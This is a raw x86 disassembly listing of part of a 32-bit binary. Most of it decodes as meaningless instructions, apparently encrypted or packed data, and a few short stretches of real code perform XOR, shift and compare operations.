  41b0ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0ed:	push   ss
  41b0ee:	sbb    ecx,DWORD PTR [ebx+0x4a6de1ae]
  41b0f4:	fs push cs
  41b0f6:	bound  ebp,QWORD PTR [esi-0x2db42b2a]
  41b0fc:	mov    ah,BYTE PTR [edx+eax*8]
  41b0ff:	pusha  
  41b100:	(bad)  
  41b101:	mov    ah,0x32
  41b103:	ins    BYTE PTR es:[edi],dx
  41b104:	in     eax,0xec
  41b106:	push   0xffffffe8
  41b108:	adc    DWORD PTR [eax],ebx
  41b10a:	in     eax,dx
  41b10b:	imul   edi,DWORD PTR [ebx-0x61],0xf3b4e71b
  41b112:	lock sub esp,DWORD PTR [ebp+0x4549bbdf]
  41b119:	std    
  41b11a:	les    esp,FWORD PTR [esp+ecx*8]
  41b11d:	rol    ebp,1
  41b11f:	lock addr16 ss xchg esi,eax
  41b123:	mov    BYTE PTR [edi-0x80],dh
  41b126:	icebp  
  41b127:	and    BYTE PTR [ebx-0xea3e57c],0xd2
  41b12e:	xchg   edx,eax
  41b12f:	adc    edi,edi
  41b131:	mov    dl,0x7
  41b133:	push   eax
  41b134:	(bad)  
  41b135:	cmp    ebp,DWORD PTR [edx]
  41b137:	sbb    al,BYTE PTR [ebx-0x38]
  41b13a:	xchg   edi,eax
  41b13b:	or     bh,BYTE PTR [esi]
  41b13d:	test   BYTE PTR [edi],dl
  41b13f:	sbb    DWORD PTR [edi],edi
  41b141:	and    dl,BYTE PTR [eax]
  41b143:	adc    cl,BYTE PTR [esi+0x1c]
  41b146:	mov    eax,ecx
  41b148:	pop    edi
  41b149:	push   0x27cc21d3
  41b14e:	xor    esi,eax
  41b150:	stc    
  41b151:	xlat   BYTE PTR ds:[ebx]
  41b152:	push   esi
  41b153:	mov    BYTE PTR [esi-0x1e],dh
  41b156:	not    BYTE PTR [edi]
  41b158:	cs cwde 
  41b15a:	stos   DWORD PTR es:[edi],eax
  41b15b:	lods   al,BYTE PTR ds:[esi]
  41b15c:	(bad)  
  41b15d:	fistp  DWORD PTR [ecx+0x2663425]
  41b163:	cs jb  0x41b1da
  41b166:	pushf  
  41b167:	sbb    eax,0x542aa44
  41b16c:	adc    BYTE PTR [esi],dh
  41b16e:	icebp  
  41b16f:	add    BYTE PTR [edi+0x3567272c],cl
  41b175:	mov    ds:0x82070250,al
  41b17a:	imul   esp,DWORD PTR [eax],0x30
  41b17d:	fs (bad) 
  41b17f:	fisttp DWORD PTR [ebp+0x16f07786]
  41b185:	jo     0x41b1ef
  41b187:	out    dx,al
  41b188:	xor    esi,ecx
  41b18a:	push   esp
  41b18b:	add    esi,DWORD PTR [eax+0x12]
  41b18e:	xchg   ebp,eax
  41b18f:	push   ecx
  41b190:	imul   esi,DWORD PTR [edx-0x56],0x201f446d
  41b197:	cwde   
  41b198:	lahf   
  41b199:	pop    edi
  41b19a:	lock sub BYTE PTR [ebx+edx*1-0x1cbd8c85],bl
  41b1a2:	mov    cl,0xad
  41b1a4:	imul   BYTE PTR [edi+0x70]
  41b1a7:	shl    edi,0xba
  41b1aa:	test   eax,0x2cacf7b0
  41b1af:	lahf   
  41b1b0:	jp     0x41b1f4
  41b1b2:	adc    dl,dh
  41b1b4:	lock test DWORD PTR [esi+0x22acf467],0x24dbcbb0
  41b1bf:	push   eax
  41b1c0:	jmp    0xf906cb89
  41b1c5:	ins    BYTE PTR es:[edi],dx
  41b1c6:	mov    BYTE PTR [esi],bl
  41b1c8:	inc    edx
  41b1c9:	dec    edi
  41b1ca:	out    0x50,al
  41b1cc:	mov    dl,0x8b
  41b1ce:	jbe    0x41b20c
  41b1d0:	push   eax
  41b1d1:	sti    
  41b1d2:	pop    eax
  41b1d3:	dec    ebx
  41b1d4:	cmp    BYTE PTR [ecx-0x68],ch
  41b1d7:	(bad)  
  41b1d8:	pop    ebp
  41b1d9:	sbb    bh,0x99
  41b1dc:	sbb    DWORD PTR [ebx-0x73226de],esi
  41b1e2:	and    ch,BYTE PTR [ebp+eax*2+0x13a06237]
  41b1e9:	jg     0x41b22b
  41b1eb:	rol    DWORD PTR [edi],0xba
  41b1ee:	fidiv  DWORD PTR [ebx]
  41b1f0:	cmp    esp,DWORD PTR ds:0xe5ac957
  41b1f6:	xchg   BYTE PTR [ecx-0x13f640b0],ah
  41b1fc:	adc    al,dh
  41b1fe:	mov    eax,0xfd5a45f8
  41b203:	bound  esp,QWORD PTR [edi]
  41b205:	pop    edi
  41b206:	jg     0x41b1b0
  41b208:	loopne 0x41b1f6
  41b20a:	nop
  41b20b:	sbb    edx,edx
  41b20d:	ror    DWORD PTR [ebp-0x70],cl
  41b210:	xchg   BYTE PTR [eax-0x57],bh
  41b213:	pop    ds
  41b214:	pop    edx
  41b215:	push   ss
  41b216:	aas    
  41b217:	or     ah,ah
  41b219:	lods   eax,DWORD PTR ds:[esi]
  41b21a:	jne    0x41b1a7
  41b21c:	or     eax,0x8097ed17
  41b221:	jg     0x41b27c
  41b223:	push   esi
  41b224:	stos   BYTE PTR es:[edi],al
  41b225:	inc    eax
  41b226:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b227:	sahf   
  41b228:	out    0xba,al
  41b22a:	call   0x4a75:0x75254953
  41b231:	jae    0x41b248
  41b233:	xchg   ebx,eax
  41b234:	fstp   QWORD PTR [esi+ebx*4-0x23bd9e91]
  41b23b:	xchg   esp,eax
  41b23c:	and    al,0xb8
  41b23e:	xchg   ecx,eax
  41b23f:	xor    cl,BYTE PTR [ecx]
  41b241:	xchg   ebx,eax
  41b242:	pushf  
  41b243:	lea    ecx,[edi]
  41b245:	push   0xf6313e9d
  41b24a:	jmp    0x41b2ad
  41b24c:	ret    0x14ea
  41b24f:	jo     0x41b2a9
  41b251:	fwait
  41b252:	mov    ds:0x671d3eae,al
  41b257:	scas   eax,DWORD PTR es:[edi]
  41b258:	retf   
  41b259:	xor    ah,BYTE PTR [edi-0x69]
  41b25c:	ss pop esi
  41b25e:	xchg   edx,eax
  41b25f:	push   cs
  41b260:	xor    bl,bh
  41b262:	mov    cs,WORD PTR [edi+0xd]
  41b265:	ud2    
  41b267:	lods   al,BYTE PTR ds:[esi]
  41b268:	stos   BYTE PTR es:[edi],al
  41b269:	sbb    eax,0x22faae35
  41b26e:	pop    ecx
  41b26f:	add    DWORD PTR ds:0xfa4552a9,ebx
  41b275:	enter  0xdf93,0x19
  41b279:	shr    DWORD PTR [eax-0x627b04b2],1
  41b27f:	shl    BYTE PTR [edi+0x5e],1
  41b282:	adc    BYTE PTR [edx-0x782a9076],al
  41b288:	xor    BYTE PTR [esp+edx*8],al
  41b28b:	adc    ebp,ebx
  41b28d:	mov    BYTE PTR [edi],ch
  41b28f:	and    edx,DWORD PTR [ebx+0x30]
  41b292:	in     eax,dx
  41b293:	dec    BYTE PTR [ecx+0x1171ca5e]
  41b299:	dec    esp
  41b29a:	jp     0x41b2f1
  41b29c:	ss fwait
  41b29e:	or     DWORD PTR [edx-0x6f],esp
  41b2a1:	jo     0x41b311
  41b2a3:	popa   
  41b2a4:	es es inc ecx
  41b2a7:	hlt    
  41b2a8:	ja     0x41b24b
  41b2aa:	in     al,dx
  41b2ab:	push   eax
  41b2ac:	mov    ah,BYTE PTR [edx]
  41b2ae:	inc    edi
  41b2af:	sti    
  41b2b0:	xlat   BYTE PTR ds:[ebx]
  41b2b1:	dec    edi
  41b2b2:	shr    DWORD PTR [esi+0x3a526fc8],cl
  41b2b8:	push   es
  41b2b9:	retf   0xbd9
  41b2bc:	dec    ebp
  41b2bd:	xchg   ecx,eax
  41b2be:	xchg   ebp,eax
  41b2bf:	mul    BYTE PTR [edi+0x4d06001e]
  41b2c5:	pop    es
  41b2c6:	in     eax,0xea
  41b2c8:	retf   
  41b2c9:	repnz sbb ecx,DWORD PTR cs:[eax+0x424cdef3]
  41b2d1:	clc    
  41b2d2:	cmp    DWORD PTR ds:0x2013b62c,0x219eb2f0
  41b2dc:	repnz pop ebp
  41b2de:	pop    ebx
  41b2df:	repz pop ecx
  41b2e1:	aas    
  41b2e2:	sbb    al,0x85
  41b2e4:	ret    0x34f9
  41b2e7:	dec    edi
  41b2e8:	fisttp DWORD PTR [ebx]
  41b2ea:	jbe    0x41b291
  41b2ec:	test   al,0x5
  41b2ee:	jno    0x41b2c9
  41b2f0:	dec    edx
  41b2f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2f2:	lds    edx,FWORD PTR [ebx+0x4]
  41b2f5:	loopne 0x41b304
  41b2f7:	ins    BYTE PTR es:[edi],dx
  41b2f8:	daa    
  41b2f9:	outs   dx,DWORD PTR ds:[esi]
  41b2fa:	or     DWORD PTR [edi+0x36],ecx
  41b2fd:	pop    esi
  41b2fe:	push   ecx
  41b2ff:	jecxz  0x41b2c9
  41b301:	or     ecx,DWORD PTR [ecx+ecx*2-0x37]
  41b305:	xor    DWORD PTR [eax+0x15],ebp
  41b308:	fdivr  st(5),st
  41b30a:	pop    eax
  41b30b:	stos   BYTE PTR es:[edi],al
  41b30c:	jle    0x41b32e
  41b30e:	in     eax,0xae
  41b310:	jmp    0x41b2b3
  41b312:	leave  
  41b313:	and    esi,DWORD PTR [ebx+esi*8+0x23]
  41b317:	imul   ebp,ebx,0x44
  41b31a:	mov    ebx,0x137c659f
  41b31f:	int    0x1d
  41b321:	bound  esi,QWORD PTR [edx-0x7fc23b0]
  41b327:	les    ecx,FWORD PTR [edx+eiz*8-0x7a48de79]
  41b32e:	imul   ebx,DWORD PTR [eax+0x26],0xd00b368d
  41b335:	xlat   BYTE PTR ds:[ebx]
  41b336:	in     eax,0xc9
  41b338:	scas   eax,DWORD PTR es:[edi]
  41b339:	or     ch,BYTE PTR [ecx]
  41b33b:	scas   eax,DWORD PTR es:[edi]
  41b33c:	rol    BYTE PTR [ecx+0x79a577f2],0xca
  41b343:	shrd   edx,eax,0x2
  41b347:	shr    eax,0x2
  41b34a:	mov    DWORD PTR [esp+0x34],eax
  41b34e:	mov    eax,DWORD PTR [esp+0x18]
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	inc    esi
  41b368:	sbb    BYTE PTR [edi],0x7e
  41b36b:	mov    ebx,0xbc18168f
  41b370:	adc    bl,BYTE PTR [eax]
  41b372:	sbb    BYTE PTR [esi],al
  41b374:	mov    esi,0xc7d1f736
  41b379:	adc    ch,0xeb
  41b37c:	fistp  WORD PTR [ecx]
  41b37e:	cmp    DWORD PTR [ecx+0x614e6d98],eax
  41b384:	scas   eax,DWORD PTR es:[edi]
  41b385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b386:	push   ds
  41b387:	adc    esp,DWORD PTR [ebx]
  41b389:	dec    ebp
  41b38a:	(bad)  
  41b38b:	dec    ebp
  41b38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b38d:	sbb    eax,0x3c341c86
  41b392:	jne    0x41b342
  41b394:	mov    al,ds:0x65a43729
  41b399:	mov    bh,0x27
  41b39b:	(bad)  
  41b39c:	xor    al,0xc9
  41b39e:	ins    DWORD PTR es:[edi],dx
  41b39f:	(bad)  
  41b3a0:	dec    ebx
  41b3a1:	xor    bl,dl
  41b3a3:	jbe    0x41b32e
  41b3a5:	xor    ah,BYTE PTR [eax]
  41b3a7:	test   BYTE PTR [eax],cl
  41b3a9:	out    0x73,eax
  41b3ab:	xchg   esp,eax
  41b3ac:	xor    al,0x20
  41b3ae:	ja     0x41b358
  41b3b0:	mov    ecx,0xde1e3464
  41b3b5:	mov    BYTE PTR [edi],dl
  41b3b7:	jmp    0x36c5:0x29ce7c18
  41b3be:	pop    edx
  41b3bf:	xchg   BYTE PTR [ecx+0x65fb6fb3],ch
  41b3c5:	fstp   QWORD PTR [edx]
  41b3c7:	scas   al,BYTE PTR es:[edi]
  41b3c8:	das    
  41b3c9:	xchg   BYTE PTR cs:[esi],bl
  41b3cc:	adc    ebx,DWORD PTR ds:0x65124e78
  41b3d2:	adc    edx,esi
  41b3d4:	push   eax
  41b3d5:	mov    WORD PTR [ecx+0x39099221],fs
  41b3db:	outs   dx,DWORD PTR ds:[esi]
  41b3dc:	mov    ds:0x1979cb74,al
  41b3e1:	mov    ah,0x51
  41b3e3:	std    
  41b3e4:	adc    dh,BYTE PTR [ecx+0x4b]
  41b3e7:	jg     0x41b389
  41b3e9:	repnz mov cl,0xd
  41b3ec:	jmp    0x1b67a01b
  41b3f1:	(bad)  
  41b3f2:	nop
  41b3f3:	bound  esi,QWORD PTR [ebp+0x3cf291]
  41b3f9:	ret    
  41b3fa:	push   ss
  41b3fb:	inc    eax
  41b3fc:	add    ebp,DWORD PTR [ebx]
  41b3fe:	rol    DWORD PTR [ecx],cl
  41b400:	sub    al,BYTE PTR [edi-0x7]
  41b403:	or     al,0xa0
  41b405:	jmp    DWORD PTR [edi+0x57]
  41b408:	ins    BYTE PTR es:[edi],dx
  41b409:	out    0xd0,eax
  41b40b:	ins    BYTE PTR es:[edi],dx
  41b40c:	mov    dl,0xa0
  41b40e:	adc    ecx,DWORD PTR [esi]
  41b410:	sub    esi,edx
  41b412:	xchg   edi,eax
  41b413:	aad    0xfd
  41b415:	dec    edi
  41b416:	sahf   
  41b417:	xchg   edi,eax
  41b418:	or     esp,DWORD PTR es:0x2faa7418
  41b41f:	imul   edi,DWORD PTR [esp+ecx*1+0x75],0xc5f84002
  41b427:	lds    eax,FWORD PTR [edi+0xd]
  41b42a:	dec    esp
  41b42b:	inc    edi
  41b42c:	and    eax,DWORD PTR [ebx+0x64]
  41b42f:	sub    ebx,ecx
  41b431:	sahf   
  41b432:	dec    edx
  41b433:	jmp    0x41b43e
  41b435:	jae    0x41b426
  41b437:	xchg   DWORD PTR [edi-0x3a],ebp
  41b43a:	(bad)  
  41b43b:	out    dx,al
  41b43c:	dec    edi
  41b43d:	jne    0x41b4b5
  41b43f:	push   0xffffff8f
  41b441:	push   eax
  41b442:	sbb    eax,0x35624c6b
  41b447:	cmp    DWORD PTR [ebp-0x7a5c10ee],esp
  41b44d:	jae    0x41b49c
  41b44f:	pop    esp
  41b450:	jp     0x41b3fb
  41b452:	mov    DWORD PTR [edx+0x5cfbe9ed],esi
  41b458:	xchg   BYTE PTR [edi+0x71],bl
  41b45b:	cmp    al,0x5c
  41b45d:	mov    gs,WORD PTR [eax-0x65]
  41b460:	cmp    bh,BYTE PTR [ecx]
  41b462:	push   0x1a
  41b464:	mov    BYTE PTR ds:0xbea7eaa7,bh
  41b46a:	sahf   
  41b46b:	jmp    0x41b4dd
  41b46d:	and    al,0x4f
  41b46f:	adc    BYTE PTR [eax],dh
  41b471:	jmp    0x41b460
  41b473:	jno    0x41b4a4
  41b475:	mov    eax,0x8837eb30
  41b47a:	adc    ebp,DWORD PTR [eax-0x35]
  41b47d:	outs   dx,BYTE PTR ds:[esi]
  41b47e:	fsubr  st(5),st
  41b480:	adc    ecx,DWORD PTR [edi-0x99129da]
  41b486:	imul   ebx,DWORD PTR [ecx+edi*1-0x7e],0x0
  41b48b:	lahf   
  41b48c:	in     al,dx
  41b48d:	dec    edx
  41b48e:	sbb    al,0xb7
  41b490:	test   eax,0x6997991a
  41b495:	out    dx,al
  41b496:	xor    DWORD PTR [eax],esp
  41b498:	nop
  41b499:	push   cs
  41b49a:	aaa    
  41b49b:	mov    esi,0xabaffa25
  41b4a0:	scas   al,BYTE PTR es:[edi]
  41b4a1:	dec    esp
  41b4a2:	or     eax,0x1141e2f5
  41b4a7:	inc    ebx
  41b4a8:	jo     0x41b4aa
  41b4aa:	arpl   WORD PTR [esi-0x16],di
  41b4ad:	mov    ebp,0xe834f2cc
  41b4b2:	mov    edx,0xa10b274d
  41b4b7:	push   ds
  41b4b8:	dec    DWORD PTR [edi-0x3d]
  41b4bb:	mov    eax,ds:0x5a5a90d1
  41b4c0:	mov    ch,0x5d
  41b4c2:	mov    DWORD PTR [esi+0x7b],edi
  41b4c5:	add    DWORD PTR [eax-0x7b],0x2d
  41b4c9:	(bad)  
  41b4cb:	mul    BYTE PTR [eax]
  41b4cd:	repnz data16 icebp 
  41b4d0:	or     ebp,DWORD PTR [ebp-0x8cb94fc]
  41b4d6:	adc    esp,ebp
  41b4d8:	add    BYTE PTR [edi],bl
  41b4da:	xor    BYTE PTR [esi+ebx*2+0x39],0x29
  41b4df:	fisttp QWORD PTR [ecx]
  41b4e1:	lea    esp,[ebx]
  41b4e3:	cmp    BYTE PTR [edx-0x5c433a45],ah
  41b4e9:	or     esi,ebp
  41b4eb:	xor    bl,bh
  41b4ed:	ja     0x41b54c
  41b4ef:	scas   eax,DWORD PTR es:[edi]
  41b4f0:	sub    BYTE PTR [eax],al
  41b4f2:	adc    DWORD PTR [eax+0x1c9f038b],esi
  41b4f8:	pop    eax
  41b4f9:	out    dx,al
  41b4fa:	nop
  41b4fb:	(bad)  [ebx-0x4b]
  41b4fe:	mov    eax,ds:0xef669f09
  41b503:	pop    eax
  41b504:	jecxz  0x41b512
  41b506:	dec    eax
  41b507:	push   ecx
  41b508:	int    0xd7
  41b50a:	fnstsw WORD PTR [eax-0x6faa013d]
  41b510:	push   ds
  41b511:	push   0x788a359a
  41b516:	fdivrp st(0),st
  41b518:	pop    eax
  41b519:	(bad)  
  41b51a:	xor    DWORD PTR [ecx+0x28],esp
  41b51d:	xor    cl,BYTE PTR [edx]
  41b51f:	add    cl,bl
  41b521:	cmp    BYTE PTR [esi-0x7],bh
  41b524:	mov    esp,0xa2c7e96b
  41b529:	xor    esi,DWORD PTR [edi-0x68f396af]
  41b52f:	sub    ebx,ecx
  41b531:	data16 into 
  41b533:	ror    DWORD PTR [eax],0xf1
  41b536:	pop    eax
  41b537:	cmc    
  41b538:	and    DWORD PTR [ebx+ebx*8-0x54279950],edi
  41b53f:	int    0x76
  41b541:	mov    dl,0xc0
  41b543:	mov    eax,ds:0xad82e241
  41b548:	cli    
  41b549:	shr    BYTE PTR [ecx*4+0x5c9d4569],1
  41b550:	xchg   edx,eax
  41b551:	xchg   edx,eax
  41b552:	xchg   ecx,eax
  41b553:	enter  0xea97,0xa
  41b557:	repz fdivp st(5),st
  41b55a:	(bad)  
  41b55c:	and    al,BYTE PTR [ebp+0x7a3d212a]
  41b562:	dec    esp
  41b563:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b564:	or     cl,BYTE PTR [edx]
  41b566:	and    eax,0x17d3a5ad
  41b56b:	pop    es
  41b56c:	sub    BYTE PTR [esi],0xf9
  41b56f:	sub    esi,DWORD PTR [esi+0x471f6f18]
  41b575:	mov    esp,0x9e079351
  41b57a:	mov    dh,0xce
  41b57c:	push   ss
  41b57d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b57e:	lods   al,BYTE PTR ds:[esi]
  41b57f:	in     al,dx
  41b580:	sub    al,0x69
  41b582:	sub    dh,BYTE PTR [ebp+edx*8-0x60854f7d]
  41b589:	test   DWORD PTR [eax+0x304095c9],esp
  41b58f:	pop    ds
  41b590:	inc    esi
  41b591:	ficom  WORD PTR [eax+0x15]
  41b594:	jb     0x41b55b
  41b596:	and    dh,bh
  41b598:	jge    0x41b5e5
  41b59a:	icebp  
  41b59b:	in     al,0xbe
  41b59d:	pop    eax
  41b59e:	and    eax,0x5a8d21d6
  41b5a3:	inc    edi
  41b5a4:	xor    al,0x7d
  41b5a6:	aaa    
  41b5a7:	inc    BYTE PTR [edx+0x3f]
  41b5aa:	push   0x4746235
  41b5af:	lods   al,BYTE PTR ds:[esi]
  41b5b0:	mov    ebp,0xbdfe7610
  41b5b5:	test   dh,cl
  41b5b7:	stc    
  41b5b8:	sub    ebp,DWORD PTR [eax+0x78f3963c]
  41b5be:	mov    dh,0xa6
  41b5c0:	arpl   WORD PTR [ebx+0x1d3a7f8e],dx
  41b5c6:	stos   DWORD PTR es:[edi],eax
  41b5c7:	psubusw mm1,mm1
  41b5ca:	sbb    al,0x89
  41b5cc:	cmp    DWORD PTR [edi-0x4dbf4391],esi
  41b5d2:	(bad)  
  41b5d3:	jmp    0xab4f108b
  41b5d8:	jnp    0x41b5c4
  41b5da:	fcomip st,st(2)
  41b5dc:	lea    ebp,[ecx+esi*2]
  41b5df:	mov    cl,0xac
  41b5e1:	mov    WORD PTR [ebp+0x30a24ddf],ss
  41b5e7:	push   edx
  41b5e8:	enter  0x2d5d,0x52
  41b5ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5ed:	scas   al,BYTE PTR es:[edi]
  41b5ee:	cmc    
  41b5ef:	sbb    esi,DWORD PTR [ecx-0x3c]
  41b5f2:	pop    ebx
  41b5f3:	or     al,0x41
  41b5f5:	into   
  41b5f6:	pop    es
  41b5f7:	ja     0x41b5b1
  41b5f9:	in     al,0x2a
  41b5fb:	push   cs
  41b5fc:	std    
  41b5fd:	(bad)  
  41b5fe:	loopne 0x41b5c3
  41b600:	or     edi,DWORD PTR [eax]
  41b602:	inc    esi
  41b603:	and    ebx,esp
  41b605:	pop    es
  41b606:	daa    
  41b607:	xor    ch,BYTE PTR [ebp+0x187700da]
  41b60d:	cmp    BYTE PTR [ebx-0x190e62c7],0x60
  41b614:	cmp    BYTE PTR [edx+0x5d],0x2f
  41b618:	pop    ds
  41b619:	adc    al,0x4d
  41b61b:	(bad)  
  41b61c:	adc    esi,DWORD PTR [edi]
  41b61e:	dec    ecx
  41b61f:	sub    cl,BYTE PTR [ebp+0x38ebee4d]
  41b625:	mov    ah,al
  41b627:	clc    
  41b628:	fwait
  41b629:	pusha  
  41b62a:	lea    ecx,[ebx+0x5d]
  41b62d:	push   ds
  41b62e:	add    al,0x2b
  41b630:	lods   eax,DWORD PTR ds:[esi]
  41b631:	jmp    0xda08:0x986b5ba
  41b638:	pop    ds
  41b639:	enter  0x3a6,0xcf
  41b63d:	cmp    eax,0x8722685f
  41b642:	sub    BYTE PTR es:[eax],dh
  41b645:	loopne 0x41b68a
  41b647:	xchg   ebp,eax
  41b648:	cmp    cl,BYTE PTR [ebx]
  41b64a:	mov    al,ds:0x3dea0d09
  41b64f:	cmc    
  41b650:	scas   eax,DWORD PTR es:[edi]
  41b651:	sub    eax,0x71299d6c
  41b656:	aam    0x7d
  41b658:	pusha  
  41b659:	push   es
  41b65a:	(bad)  
  41b65c:	imul   ecx,DWORD PTR [eax+0x38190933],0x3f436d40
  41b666:	fst    st(4)
  41b668:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b669:	inc    edx
  41b66a:	xchg   ebp,eax
  41b66b:	mov    BYTE PTR [ebp+eax*2+0x913f6d],0xb2
  41b673:	(bad)  
  41b674:	(bad)  
  41b675:	clc    
  41b676:	rcl    BYTE PTR [ecx-0x4fe8d573],cl
  41b67c:	and    eax,0xbe9d76cf
  41b681:	pop    edx
  41b682:	xor    BYTE PTR [eax+0x51],cl
  41b685:	adc    DWORD PTR [ebx-0x10c6607],ebp
  41b68b:	nop
  41b68c:	(bad)  
  41b68d:	loop   0x41b703
  41b68f:	or     esi,0x3c
  41b692:	out    0x2b,eax
  41b694:	sti    
  41b695:	fadd   QWORD PTR [ebp-0x36e4302]
  41b69b:	daa    
  41b69c:	into   
  41b69d:	ins    DWORD PTR es:[edi],dx
  41b69e:	arpl   bx,dx
  41b6a0:	mov    ebp,0x2897eb1a
  41b6a5:	hlt    
  41b6a6:	inc    eax
  41b6a7:	mov    esp,0x80159990
  41b6ac:	cdq    
  41b6ad:	fs cld 
  41b6af:	sahf   
  41b6b0:	pmulhuw mm2,QWORD PTR [ebx+0x77]
  41b6b4:	cmp    BYTE PTR [esi+0x1a],al
  41b6b7:	push   cs
  41b6b8:	sti    
  41b6b9:	add    al,0x9a
  41b6bb:	out    dx,eax
  41b6bc:	xchg   esi,eax
  41b6bd:	out    dx,al
  41b6be:	mov    ds,WORD PTR [ebp+0x1d]
  41b6c1:	xchg   BYTE PTR [esi+0x3c],cl
  41b6c4:	out    0xa3,eax
  41b6c6:	jns    0x41b6e6
  41b6c8:	push   cs
  41b6c9:	inc    edx
  41b6ca:	cmp    edi,eax
  41b6cc:	or     al,0xdc
  41b6ce:	mov    ebx,0xc60477c7
  41b6d3:	push   esi
  41b6d4:	jne    0x41b6e2
  41b6d6:	fs adc al,0x55
  41b6d9:	sub    DWORD PTR [esi-0x2f],0xbc78e8ea
  41b6e0:	xchg   ecx,eax
  41b6e1:	pop    ebx
  41b6e2:	mov    edi,0x34f6c47b
  41b6e7:	mov    ah,0xca
  41b6e9:	pusha  
  41b6ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6eb:	cli    
  41b6ec:	rcl    dl,1
  41b6ee:	mov    eax,0x1553d4d7
  41b6f3:	mov    BYTE PTR [ecx-0x6396d4ad],ah
  41b6f9:	rol    DWORD PTR [eax+0x2753f81b],0xe2
  41b700:	pop    esi
  41b701:	js     0x41b6c4
  41b703:	dec    edi
  41b704:	adc    DWORD PTR [edi],ecx
  41b706:	and    ecx,DWORD PTR [esi+edi*1]
  41b709:	dec    esp
  41b70a:	bound  ecx,QWORD PTR [esi+0x1b]
  41b70d:	loopne 0x41b6d0
  41b70f:	sub    al,0x5f
  41b711:	jae    0x41b74f
  41b713:	jns    0x41b6ed
  41b715:	xor    eax,0xa0ab18ae
  41b71a:	test   DWORD PTR [esi+eiz*2+0x74],eax
  41b71e:	sub    DWORD PTR [ecx+0x4601632a],ecx
  41b724:	imul   eax,ecx,0xffffffe0
  41b727:	push   ds
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x4225b4
  41b758:	mov    DWORD PTR [esp+0x68],0x4225ac
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x42253c
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx-0x1855d674],dh
  41b815:	sub    eax,0x895ebc67
  41b81a:	push   ss
  41b81b:	sbb    BYTE PTR [edx+edx*1-0x7277e7e8],bh
  41b822:	push   ebx
  41b823:	fild   WORD PTR [edi-0x80539f3]
  41b829:	and    esi,DWORD PTR [edi]
  41b82b:	xor    cl,BYTE PTR [ebx+0x7c495f3f]
  41b831:	inc    esp
  41b832:	sub    BYTE PTR [edx+0x233c18f7],0xd9
  41b839:	add    al,0x10
  41b83b:	jg     0x41b802
  41b83d:	cld    
  41b83e:	adc    DWORD PTR [ecx-0x363fe60c],ebx
  41b844:	cmp    BYTE PTR ds:[eax],bh
  41b847:	sbb    dh,ah
  41b849:	scas   al,BYTE PTR es:[edi]
  41b84a:	aaa    
  41b84b:	mov    edi,DWORD PTR [edi+0x3d]
  41b84e:	cmp    BYTE PTR [edi-0x2c3bdb0c],0xcd
  41b855:	sar    BYTE PTR [edi+0x53af30c9],cl
  41b85b:	push   0x5d
  41b85d:	fcmovb st,st(5)
  41b85f:	xchg   esp,eax
  41b860:	and    DWORD PTR [eax],ebx
  41b862:	inc    ebx
  41b863:	xchg   edi,eax
  41b864:	mov    ds:0xf7201c21,eax
  41b869:	fnsave [esi+0x3c7f53ac]
  41b86f:	nop
  41b870:	xor    edi,DWORD PTR [edx]
  41b872:	cwde   
  41b873:	shr    BYTE PTR [esi-0x3a],cl
